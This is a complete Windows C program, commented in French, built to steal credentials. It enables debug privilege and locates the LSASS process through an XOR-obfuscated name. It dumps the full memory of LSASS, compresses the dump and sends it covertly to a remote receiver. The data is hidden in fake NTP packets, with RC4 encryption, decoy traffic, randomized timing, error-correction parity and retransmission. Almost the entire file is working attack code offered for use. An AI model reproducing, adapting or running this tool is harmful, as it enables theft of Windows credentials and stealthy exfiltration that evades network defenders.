#define UNICODE
#define _UNICODE

#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <zlib.h>
#include <ws2tcpip.h>
#include <time.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "DbgHelp.lib")

// --- Configuration furtive et FEC ---
#define FRAGMENT_SIZE 2              // Nombre d'octets utiles par fragment (données exfiltrées)
#define RC4_KEY "MySecretKey"        // Clé RC4 (à adapter)
#define BLOCK_SIZE 10                // Taille du bloc pour FEC (nombre de fragments de données par bloc)
                                     // Pour chaque bloc, on génère un nombre égal (m = k) de fragments de parité
#define MAX_RETRANS 5                // Nombre maximum de cycles de retransmission
#define BASE_DELAY_MIN 50            // Délai min (ms) entre paquets
#define BASE_DELAY_MAX 150           // Délai max (ms) entre paquets
#define FEEDBACK_TIMEOUT 3000        // Timeout (ms) pour chaque cycle de feedback (3 sec)
#define SOCKET_RCVBUF_SIZE (1<<20)   // 1 Mo de buffer

// --- Tableaux GF(256) pour Reed-Solomon ---
static unsigned char gf_exp[512];
static unsigned char gf_log[256];

// Initialisation de GF(256) avec le polynôme primitif 0x11d
void init_gf() {
    unsigned char x = 1;
    for (int i = 0; i < 255; i++) {
        gf_exp[i] = x;
        gf_log[x] = i;
        x <<= 1;
        if (x & 0x100)
            x ^= 0x11d;
    }
    for (int i = 255; i < 512; i++) {
        gf_exp[i] = gf_exp[i - 255];
    }
}

unsigned char gf_mul(unsigned char a, unsigned char b) {
    if (a == 0 || b == 0)
        return 0;
    int log_a = gf_log[a];
    int log_b = gf_log[b];
    int log_result = log_a + log_b;
    return gf_exp[log_result % 255];
}

// Encode un bloc de données (vecteur de k symboles, chacun d'un octet) en générant m symboles de parité.
// Ici, on utilisera un générateur Vandermonde simple : pour j=0..m-1, parity[j] = Σ data[i] * (alpha^(i*(j+1))) sur GF(256)
void rs_encode_block(const unsigned char *data, int k, unsigned char *parity, int m) {
    for (int j = 0; j < m; j++) {
        parity[j] = 0;
        for (int i = 0; i < k; i++) {
            unsigned char coefficient = gf_exp[(i * (j + 1)) % 255]; // coefficient = alpha^(i*(j+1))
            parity[j] ^= gf_mul(data[i], coefficient);
        }
    }
}

// --- Fonctions RC4 (simples) ---
void rc4_init(unsigned char *S, const unsigned char *key, int keylen) {
    for (int i = 0; i < 256; i++) {
         S[i] = (unsigned char)i;
    }
    int j = 0;
    for (int i = 0; i < 256; i++) {
         j = (j + S[i] + key[i % keylen]) & 0xFF;
         unsigned char temp = S[i];
         S[i] = S[j];
         S[j] = temp;
    }
}

void rc4_crypt(unsigned char *S, const unsigned char *in, unsigned char *out, int len) {
    int i = 0, j = 0;
    for (int k = 0; k < len; k++) {
         i = (i + 1) & 0xFF;
         j = (j + S[i]) & 0xFF;
         unsigned char temp = S[i];
         S[i] = S[j];
         S[j] = temp;
         unsigned char rnd = S[(S[i] + S[j]) & 0xFF];
         out[k] = in[k] ^ rnd;
    }
}

// --- Activation du privilège ---
BOOL EnableDebugPrivilege(void) {
    HMODULE hAdvapi = LoadLibraryW(L"advapi32.dll");
    if (!hAdvapi) {
        printf("[!] Failed to load advapi32.dll.\n");
        return FALSE;
    }
    typedef BOOL (WINAPI *pOpenProcessToken)(HANDLE, DWORD, PHANDLE);
    typedef BOOL (WINAPI *pLookupPrivilegeValueW)(LPCWSTR, LPCWSTR, PLUID);
    typedef BOOL (WINAPI *pAdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);

    pOpenProcessToken fOpenProcessToken = (pOpenProcessToken)GetProcAddress(hAdvapi, "OpenProcessToken");
    pLookupPrivilegeValueW fLookupPrivilegeValueW = (pLookupPrivilegeValueW)GetProcAddress(hAdvapi, "LookupPrivilegeValueW");
    pAdjustTokenPrivileges fAdjustTokenPrivileges = (pAdjustTokenPrivileges)GetProcAddress(hAdvapi, "AdjustTokenPrivileges");

    if (!fOpenProcessToken || !fLookupPrivilegeValueW || !fAdjustTokenPrivileges) {
        printf("[!] Failed to retrieve one or more functions from advapi32.dll.\n");
        return FALSE;
    }

    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!fOpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("[!] OpenProcessToken failed.\n");
        return FALSE;
    }
    if (!fLookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid)) {
        printf("[!] LookupPrivilegeValue failed.\n");
        CloseHandle(hToken);
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!fAdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        printf("[!] AdjustTokenPrivileges failed.\n");
        CloseHandle(hToken);
        return FALSE;
    }
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("[!] The token does not have the required privilege.\n");
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);
    return TRUE;
}

// --- Fonctions utilitaires ---
wchar_t* ConvertToWideChar(const char* charStr) {
    int sizeNeeded = MultiByteToWideChar(CP_ACP, 0, charStr, -1, NULL, 0);
    wchar_t* wStr = (wchar_t*)malloc(sizeNeeded * sizeof(wchar_t));
    if (wStr) {
        MultiByteToWideChar(CP_ACP, 0, charStr, -1, wStr, sizeNeeded);
    }
    return wStr;
}

void DecodeString(const wchar_t *encoded, int key, wchar_t *decoded, size_t maxLen) {
    size_t i = 0;
    while (encoded[i] != L'\0' && i < maxLen - 1) {
        decoded[i] = encoded[i] ^ key;
        i++;
    }
    decoded[i] = L'\0';
}

DWORD GetTargetProcessPID(const wchar_t *targetProcessName) {
    DWORD pid = 0;
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32)
        return 0;
    typedef HANDLE (WINAPI *pCreateToolhelp32Snapshot)(DWORD, DWORD);
    typedef BOOL (WINAPI *pProcess32FirstW)(HANDLE, LPPROCESSENTRY32W);
    typedef BOOL (WINAPI *pProcess32NextW)(HANDLE, LPPROCESSENTRY32W);
    typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
    pCreateToolhelp32Snapshot fCreateToolhelp32Snapshot = (pCreateToolhelp32Snapshot)GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
    pProcess32FirstW fProcess32FirstW = (pProcess32FirstW)GetProcAddress(hKernel32, "Process32FirstW");
    pProcess32NextW fProcess32NextW = (pProcess32NextW)GetProcAddress(hKernel32, "Process32NextW");
    pCloseHandle fCloseHandle = (pCloseHandle)GetProcAddress(hKernel32, "CloseHandle");
    if (!fCreateToolhelp32Snapshot || !fProcess32FirstW || !fProcess32NextW || !fCloseHandle)
        return 0;
    HANDLE hSnapshot = fCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return 0;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    if (fProcess32FirstW(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, targetProcessName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (fProcess32NextW(hSnapshot, &pe));
    }
    fCloseHandle(hSnapshot);
    return pid;
}

BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
    HMODULE hDbgHelp = LoadLibraryW(L"DbgHelp.dll");
    if (!hDbgHelp)
        return FALSE;
    typedef BOOL (WINAPI *MiniDumpWriteDumpType)(HANDLE, DWORD, HANDLE, MINIDUMP_TYPE,
        PMINIDUMP_EXCEPTION_INFORMATION, PMINIDUMP_USER_STREAM_INFORMATION, PMINIDUMP_CALLBACK_INFORMATION);
    MiniDumpWriteDumpType MiniDumpWriteDumpFunc = (MiniDumpWriteDumpType)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
    if (!MiniDumpWriteDumpFunc) {
        FreeLibrary(hDbgHelp);
        return FALSE;
    }
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) {
        FreeLibrary(hDbgHelp);
        return FALSE;
    }
    char tempPath[MAX_PATH];
    if (!GetTempPathA(MAX_PATH, tempPath)) {
        CloseHandle(hProcess);
        FreeLibrary(hDbgHelp);
        return FALSE;
    }
    char tempFile[MAX_PATH];
    sprintf(tempFile, "%s\\dumpfile_%u.dmp", tempPath, GetCurrentProcessId());
    HANDLE hFile = CreateFileA(tempFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
        FreeLibrary(hDbgHelp);
        return FALSE;
    }
    BOOL success = MiniDumpWriteDumpFunc(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    if (!success) {
        CloseHandle(hFile);
        CloseHandle(hProcess);
        FreeLibrary(hDbgHelp);
        DeleteFileA(tempFile);
        return FALSE;
    }
    LARGE_INTEGER liSize;
    if (!GetFileSizeEx(hFile, &liSize)) {
        CloseHandle(hFile);
        CloseHandle(hProcess);
        FreeLibrary(hDbgHelp);
        DeleteFileA(tempFile);
        return FALSE;
    }
    *dumpSize = (size_t)liSize.QuadPart;
    *dumpBuffer = (char*)malloc(*dumpSize);
    if (!*dumpBuffer) {
        CloseHandle(hFile);
        CloseHandle(hProcess);
        FreeLibrary(hDbgHelp);
        DeleteFileA(tempFile);
        return FALSE;
    }
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    DWORD bytesRead = 0;
    if (!ReadFile(hFile, *dumpBuffer, (DWORD)*dumpSize, &bytesRead, NULL) || bytesRead != *dumpSize) {
        free(*dumpBuffer);
        *dumpBuffer = NULL;
        CloseHandle(hFile);
        CloseHandle(hProcess);
        FreeLibrary(hDbgHelp);
        DeleteFileA(tempFile);
        return FALSE;
    }
    CloseHandle(hFile);
    CloseHandle(hProcess);
    FreeLibrary(hDbgHelp);
    DeleteFileA(tempFile);
    return TRUE;
}

int CompressBuffer(const char *inputBuffer, size_t inputSize, char **compressedBuffer, size_t *compressedSize) {
    uLong bound = compressBound(inputSize);
    *compressedBuffer = (char*)malloc(bound);
    if (!*compressedBuffer)
        return Z_MEM_ERROR;
    int res = compress((Bytef*)*compressedBuffer, &bound, (const Bytef*)inputBuffer, inputSize);
    if (res == Z_OK) {
        *compressedSize = bound;
    } else {
        free(*compressedBuffer);
    }
    return res;
}

// --- Envoi des paquets NTP ---
// La fonction CreateNTPPacket() insère le payload (8 octets) dans le champ Transmit Timestamp.
void CreateNTPPacket(const unsigned char payload[8], unsigned char packet[48]) {
    memset(packet, 0, 48);
    packet[0] = 0x1B; // LI=0, VN=3, Mode=3
    memcpy(packet + 40, payload, 8);
}

// On bind le socket sur le port source 123 pour imiter un client NTP légitime.
int SendNTPPacket(const char *target_ip, int target_port, const unsigned char payload[8]) {
    HMODULE hWs2_32 = GetModuleHandleW(L"ws2_32.dll");
    if (!hWs2_32)
        return -1;
    typedef int (WSAAPI *pWSAStartup)(WORD, LPWSADATA);
    typedef SOCKET (WSAAPI *pSocket)(int, int, int);
    typedef int (WSAAPI *pSendTo)(SOCKET, const char*, int, int, const struct sockaddr*, int);
    typedef int (WSAAPI *pClosesocket)(SOCKET);
    typedef int (WSAAPI *pWSACleanup)(void);
    pWSAStartup fWSAStartup = (pWSAStartup)GetProcAddress(hWs2_32, "WSAStartup");
    pSocket fSocket = (pSocket)GetProcAddress(hWs2_32, "socket");
    pSendTo fSendTo = (pSendTo)GetProcAddress(hWs2_32, "sendto");
    pClosesocket fClosesocket = (pClosesocket)GetProcAddress(hWs2_32, "closesocket");
    pWSACleanup fWSACleanup = (pWSACleanup)GetProcAddress(hWs2_32, "WSACleanup");
    if (!fWSAStartup || !fSocket || !fSendTo || !fClosesocket || !fWSACleanup)
        return -1;
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    if (fWSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return -1;
    sock = fSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        fWSACleanup();
        return -1;
    }
    struct sockaddr_in localAddr;
    memset(&localAddr, 0, sizeof(localAddr));
    localAddr.sin_family = AF_INET;
    localAddr.sin_addr.s_addr = INADDR_ANY;
    localAddr.sin_port = htons(123);
    bind(sock, (struct sockaddr*)&localAddr, sizeof(localAddr));
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(target_port);
    addr.sin_addr.s_addr = inet_addr(target_ip);
    unsigned char packet[48];
    CreateNTPPacket(payload, packet);
    int result = fSendTo(sock, (const char*)packet, 48, 0, (struct sockaddr*)&addr, sizeof(addr));
    fClosesocket(sock);
    fWSACleanup();
    return result;
}

// Fonction d'envoi d'un paquet décoy (leurre) avec des caractéristiques NTP plausibles.
int SendDecoyNTPPacket(const char *target_ip, int target_port) {
    unsigned char payload[8];
    unsigned int current_ntp = (unsigned int)(time(NULL) + 2208988800UL + (rand() % 20));
    payload[0] = (current_ntp >> 24) & 0xFF;
    payload[1] = (current_ntp >> 16) & 0xFF;
    payload[2] = (current_ntp >> 8) & 0xFF;
    payload[3] = current_ntp & 0xFF;
    unsigned int fraction = rand();
    payload[4] = (fraction >> 24) & 0xFF;
    payload[5] = (fraction >> 16) & 0xFF;
    payload[6] = (fraction >> 8) & 0xFF;
    payload[7] = fraction & 0xFF;
    if (SendNTPPacket(target_ip, target_port, payload) == SOCKET_ERROR) {
        printf("[!] Failed to send decoy packet.\n");
        return -1;
    }
    printf("[+] Decoy packet sent.\n");
    return 0;
}

// --- Envoi furtif du dump compressé avec FEC amélioré ---
// Pour chaque fragment de données, on prépare un payload de 8 octets :
// - Les 4 premiers octets contiennent un timestamp NTP plausible.
// - Les 4 suivants contiennent (après chiffrement RC4) la combinaison de :
//     • 16 bits du numéro de fragment (partie haute)
//     • 16 bits du fragment de données (partie basse)
// Ensuite, pour chaque bloc de BLOCK_SIZE fragments de données, nous générons un nombre égal de fragments de parité (RS)
// en traitant chaque position d'octet séparément.
int SendCompressedDumpAsNTP(const char *target_ip, int target_port, const char *compressedData, size_t compressedSize) {
    // Calcul du nombre total de fragments de données basés sur FRAGMENT_SIZE.
    int total_fragments = (int)((compressedSize + FRAGMENT_SIZE - 1) / FRAGMENT_SIZE);

    // Envoi du header (non déguisé) : 8 octets contenant
    // - 4 octets : total_fragments (big-endian)
    // - 4 octets : compressedSize (big-endian)
    unsigned char header[8];
    header[0] = (total_fragments >> 24) & 0xFF;
    header[1] = (total_fragments >> 16) & 0xFF;
    header[2] = (total_fragments >> 8) & 0xFF;
    header[3] = total_fragments & 0xFF;
    header[4] = ((unsigned int)compressedSize >> 24) & 0xFF;
    header[5] = ((unsigned int)compressedSize >> 16) & 0xFF;
    header[6] = ((unsigned int)compressedSize >> 8) & 0xFF;
    header[7] = ((unsigned int)compressedSize) & 0xFF;
    if (SendNTPPacket(target_ip, target_port, header) == SOCKET_ERROR) {
        printf("[!] Failed to send header packet.\n");
        return -1;
    }
    printf("[+] Header sent: %d fragments, %zu total bytes.\n", total_fragments, compressedSize);

    // Allocation et mélange des indices pour envoi aléatoire des fragments data.
    int *indices = (int*)malloc(total_fragments * sizeof(int));
    if (!indices) {
        printf("[!] Memory allocation failed for indices.\n");
        return -1;
    }
    for (int i = 0; i < total_fragments; i++) {
        indices[i] = i;
    }
    for (int i = total_fragments - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        int temp = indices[i];
        indices[i] = indices[j];
        indices[j] = temp;
    }

    // Envoi des paquets de données
    for (int k = 0; k < total_fragments; k++) {
        int seq = indices[k];
        unsigned char payload[8];
        // Partie 1 : Timestamp NTP plausible
        unsigned int current_ntp = (unsigned int)(time(NULL) + 2208988800UL + (rand() % 20));
        payload[0] = (current_ntp >> 24) & 0xFF;
        payload[1] = (current_ntp >> 16) & 0xFF;
        payload[2] = (current_ntp >> 8) & 0xFF;
        payload[3] = current_ntp & 0xFF;
        // Partie 2 : Préparation du bloc à chiffrer (numéro de fragment et données)
        uint16_t frag_val = 0;
        int offset = seq * FRAGMENT_SIZE;
        int remaining = (int)compressedSize - offset;
        if (remaining > 0) {
            frag_val = ((unsigned char)compressedData[offset]) << 8;
            if (remaining > 1)
                frag_val |= (unsigned char)compressedData[offset + 1];
        }
        uint32_t plain = (((uint32_t)seq & 0xFFFF) << 16) | frag_val;
        unsigned char plain_bytes[4] = {
            (plain >> 24) & 0xFF,
            (plain >> 16) & 0xFF,
            (plain >> 8) & 0xFF,
            plain & 0xFF
        };
        unsigned char S[256];
        rc4_init(S, (const unsigned char*)RC4_KEY, (int)strlen(RC4_KEY));
        int skip = (seq * 7) & 0xFF;
        unsigned char dummy;
        for (int i = 0; i < skip; i++) {
            rc4_crypt(S, &dummy, &dummy, 1);
        }
        unsigned char cipher[4];
        rc4_crypt(S, plain_bytes, cipher, 4);
        payload[4] = cipher[0];
        payload[5] = cipher[1];
        payload[6] = cipher[2];
        payload[7] = cipher[3];
        if (SendNTPPacket(target_ip, target_port, payload) == SOCKET_ERROR) {
            printf("[!] Failed to send packet for fragment %d.\n", seq);
            free(indices);
            return -1;
        }
        printf("[+] Data packet for fragment %d/%d sent.\n", seq + 1, total_fragments);
        if (rand() % 5 == 0) {
            SendDecoyNTPPacket(target_ip, target_port);
        }
        Sleep((rand() % (BASE_DELAY_MAX - BASE_DELAY_MIN + 1)) + BASE_DELAY_MIN);
    }
    free(indices);

    // --- Génération FEC par blocs RS ---  
    // Pour chaque bloc de données de taille k (k = BLOCK_SIZE ou moins pour le dernier bloc),
    // nous générons m = k fragments de parité.
    int block_start = 0;
    int block_index = 0;
    while (block_start < total_fragments) {
        int k_block = (total_fragments - block_start) < BLOCK_SIZE ? (total_fragments - block_start) : BLOCK_SIZE;
        int m = k_block; // Pour full recovery, m = k_block.
        // Pour chaque position d'octet dans le fragment (0 et 1), on encode séparément.
        unsigned char data_block[BLOCK_SIZE]; // contiendra k_block symboles pour une position.
        unsigned char parity0[BLOCK_SIZE]; // parité pour position 0
        unsigned char parity1[BLOCK_SIZE]; // parité pour position 1
        memset(parity0, 0, BLOCK_SIZE);
        memset(parity1, 0, BLOCK_SIZE);
        // Pour la position 0:
        for (int i = 0; i < k_block; i++) {
            int frag_idx = block_start + i;
            int offset = frag_idx * FRAGMENT_SIZE;
            unsigned char sym = 0;
            if (offset < compressedSize)
                sym = (unsigned char)compressedData[offset];
            data_block[i] = sym;
        }
        rs_encode_block(data_block, k_block, parity0, m);
        // Pour la position 1:
        for (int i = 0; i < k_block; i++) {
            int frag_idx = block_start + i;
            int offset = frag_idx * FRAGMENT_SIZE + 1;
            unsigned char sym = 0;
            if (offset < compressedSize)
                sym = (unsigned char)compressedData[offset];
            data_block[i] = sym;
        }
        rs_encode_block(data_block, k_block, parity1, m);
        // Envoi des m paquets de parité pour ce bloc.
        for (int j = 0; j < m; j++) {
            unsigned char payload[8];
            // Timestamp plausible
            unsigned int current_ntp = (unsigned int)(time(NULL) + 2208988800UL + (rand() % 20));
            payload[0] = (current_ntp >> 24) & 0xFF;
            payload[1] = (current_ntp >> 16) & 0xFF;
            payload[2] = (current_ntp >> 8) & 0xFF;
            payload[3] = current_ntp & 0xFF;
            // Construire un numéro de séquence FEC :
            // On marque le MSB à 1 pour signaler FEC et on encode le numéro de bloc et l'index dans le bloc.
            int fec_seq = 0x80000000 | ((block_index * BLOCK_SIZE + j) & 0x7FFFFFFF);
            // On combine ce numéro de séquence avec les symboles de parité pour les 2 positions :
            // On place 16 bits du fec_seq en haut et 16 bits : (parity0[j] << 8) | parity1[j] en bas.
            uint32_t plain = (((uint32_t)fec_seq & 0xFFFF) << 16) | (((uint32_t)parity0[j] << 8) | parity1[j]);
            unsigned char plain_bytes[4] = {
                (plain >> 24) & 0xFF,
                (plain >> 16) & 0xFF,
                (plain >> 8) & 0xFF,
                plain & 0xFF
            };
            unsigned char S[256];
            rc4_init(S, (const unsigned char*)RC4_KEY, (int)strlen(RC4_KEY));
            int skip = ((block_index * BLOCK_SIZE + j) * 13) & 0xFF;
            unsigned char dummy;
            for (int i = 0; i < skip; i++) {
                rc4_crypt(S, &dummy, &dummy, 1);
            }
            unsigned char cipher[4];
            rc4_crypt(S, plain_bytes, cipher, 4);
            payload[4] = cipher[0];
            payload[5] = cipher[1];
            payload[6] = cipher[2];
            payload[7] = cipher[3];
            if (SendNTPPacket(target_ip, target_port, payload) == SOCKET_ERROR) {
                printf("[!] Failed to send FEC packet for block %d, index %d.\n", block_index, j);
            } else {
                printf("[+] FEC packet for block %d, index %d sent.\n", block_index, j);
            }
            Sleep((rand() % (BASE_DELAY_MAX - BASE_DELAY_MIN + 1)) + BASE_DELAY_MIN);
        }
        block_index++;
        block_start += k_block;
    }
    printf("[+] All data and FEC packets sent.\n");
    return total_fragments;
}

// --- Traitement amélioré des retransmissions ---
// On effectue plusieurs cycles (jusqu'à MAX_RETRANS) pour retransmettre les fragments manquants.
void ProcessRetransmissions(const char *target_ip, int target_port, const char *compressedData, size_t compressedSize, int total_fragments) {
    int attempt = 0;
    int missingCount = 0;
    do {
        SOCKET fbSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (fbSock == INVALID_SOCKET) {
            printf("[!] Failed to create feedback socket.\n");
            return;
        }
        int rcvbuf = SOCKET_RCVBUF_SIZE;
        setsockopt(fbSock, SOL_SOCKET, SO_RCVBUF, (const char*)&rcvbuf, sizeof(rcvbuf));
        struct sockaddr_in localAddr;
        memset(&localAddr, 0, sizeof(localAddr));
        localAddr.sin_family = AF_INET;
        localAddr.sin_addr.s_addr = INADDR_ANY;
        localAddr.sin_port = htons(123);
        if (bind(fbSock, (struct sockaddr*)&localAddr, sizeof(localAddr)) == SOCKET_ERROR) {
            printf("[!] Failed to bind feedback socket.\n");
            closesocket(fbSock);
            return;
        }
        int timeout = FEEDBACK_TIMEOUT;
        setsockopt(fbSock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
        char fbBuffer[1024];
        struct sockaddr_in senderAddr;
        int addrLen = sizeof(senderAddr);
        int recvLen = recvfrom(fbSock, fbBuffer, sizeof(fbBuffer), 0, (struct sockaddr*)&senderAddr, &addrLen);
        closesocket(fbSock);
        if (recvLen > 0) {
            missingCount = (fbBuffer[0] << 24) | (fbBuffer[1] << 16) | (fbBuffer[2] << 8) | fbBuffer[3];
            if (missingCount <= 0) {
                printf("[+] No missing fragments reported.\n");
                break;
            }
            printf("[*] Feedback received: %d missing fragments. Retransmitting...\n", missingCount);
            for (int i = 0; i < missingCount; i++) {
                int offset = 4 + i * 4;
                int seq = (fbBuffer[offset] << 24) | (fbBuffer[offset+1] << 16) | (fbBuffer[offset+2] << 8) | fbBuffer[offset+3];
                unsigned char payload[8];
                unsigned int current_ntp = (unsigned int)(time(NULL) + 2208988800UL + (rand() % 20));
                payload[0] = (current_ntp >> 24) & 0xFF;
                payload[1] = (current_ntp >> 16) & 0xFF;
                payload[2] = (current_ntp >> 8) & 0xFF;
                payload[3] = current_ntp & 0xFF;
                uint16_t frag_val = 0;
                int data_offset = seq * FRAGMENT_SIZE;
                int remaining = (int)compressedSize - data_offset;
                if (remaining > 0) {
                    frag_val = ((unsigned char)compressedData[data_offset]) << 8;
                    if (remaining > 1)
                        frag_val |= (unsigned char)compressedData[data_offset + 1];
                }
                uint32_t plain = (((uint32_t)seq & 0xFFFF) << 16) | frag_val;
                unsigned char plain_bytes[4] = {
                    (plain >> 24) & 0xFF,
                    (plain >> 16) & 0xFF,
                    (plain >> 8) & 0xFF,
                    plain & 0xFF
                };
                unsigned char S[256];
                rc4_init(S, (const unsigned char*)RC4_KEY, (int)strlen(RC4_KEY));
                int skip = (seq * 7) & 0xFF;
                unsigned char dummy;
                for (int j = 0; j < skip; j++) {
                    rc4_crypt(S, &dummy, &dummy, 1);
                }
                unsigned char cipher[4];
                rc4_crypt(S, plain_bytes, cipher, 4);
                payload[4] = cipher[0];
                payload[5] = cipher[1];
                payload[6] = cipher[2];
                payload[7] = cipher[3];
                if (SendNTPPacket(target_ip, target_port, payload) == SOCKET_ERROR) {
                    printf("[!] Failed to retransmit packet %d.\n", seq);
                } else {
                    printf("[+] Packet %d retransmitted.\n", seq);
                }
                Sleep((rand() % (BASE_DELAY_MAX - BASE_DELAY_MIN + 1)) + BASE_DELAY_MIN);
            }
        } else {
            printf("[!] No feedback received in this cycle.\n");
            missingCount = 0;
        }
        attempt++;
    } while (missingCount > 0 && attempt < MAX_RETRANS);
    if (missingCount > 0)
        printf("[!] Retransmission ended with %d fragments still missing.\n", missingCount);
    else
        printf("[+] All missing fragments retransmitted successfully.\n");
}

int main(void) {
    srand((unsigned int)time(NULL));
    init_gf(); // Initialisation des tables GF(256) pour RS

    if (!EnableDebugPrivilege()) {
        printf("[!] Failed to enable SeDebugPrivilege.\n");
        return 1;
    }

    // Obfuscation de "lsass.exe" (chaque caractère XOR avec 0x13)
    wchar_t encodedTarget[] = { 'l' ^ 0x13, 's' ^ 0x13, 'a' ^ 0x13, 's' ^ 0x13,
                                  's' ^ 0x13, '.' ^ 0x13, 'e' ^ 0x13, 'x' ^ 0x13,
                                  'e' ^ 0x13, L'\0' };
    wchar_t targetProcessName[256];
    DecodeString(encodedTarget, 0x13, targetProcessName, 256);
    wprintf(L"[*] Decoded target process: %s\n", targetProcessName);

    char target_ip[64];
    int target_port;
    printf("[*] Enter receiver IP: ");
    if (scanf("%63s", target_ip) != 1) {
        printf("[!] Failed to read receiver IP.\n");
        return 1;
    }
    printf("[*] Enter receiver port: ");
    if (scanf("%d", &target_port) != 1) {
        printf("[!] Failed to read receiver port.\n");
        return 1;
    }

    DWORD pid = GetTargetProcessPID(targetProcessName);
    if (pid == 0) {
        printf("[!] Target process not found.\n");
        return 1;
    }
    wprintf(L"[+] Process %s found with PID %lu\n", targetProcessName, pid);

    char *dumpBuffer = NULL;
    size_t dumpSize = 0;
    if (!DumpProcessToMemory(pid, &dumpBuffer, &dumpSize)) {
        printf("[!] Failed to dump process memory.\n");
        return 1;
    }
    printf("[+] Memory dump completed. Size: %zu bytes.\n", dumpSize);

    char *compressedBuffer = NULL;
    size_t compressedSize = 0;
    int compRes = CompressBuffer(dumpBuffer, dumpSize, &compressedBuffer, &compressedSize);
    free(dumpBuffer);
    if (compRes != Z_OK) {
        printf("[!] Failed to compress dump. Error: %d\n", compRes);
        return 1;
    }
    printf("[+] Compression completed. Compressed size: %zu bytes.\n", compressedSize);

    int total_fragments = (int)((compressedSize + FRAGMENT_SIZE - 1) / FRAGMENT_SIZE);
    int sendRes = SendCompressedDumpAsNTP(target_ip, target_port, compressedBuffer, compressedSize);
    if (sendRes == -1) {
        printf("[!] Failed to send compressed dump to receiver.\n");
        free(compressedBuffer);
        return 1;
    }
    printf("[+] Initial transmission completed.\n");

    ProcessRetransmissions(target_ip, target_port, compressedBuffer, compressedSize, total_fragments);

    free(compressedBuffer);
    printf("[+] Done!\n");
    return 0;
}
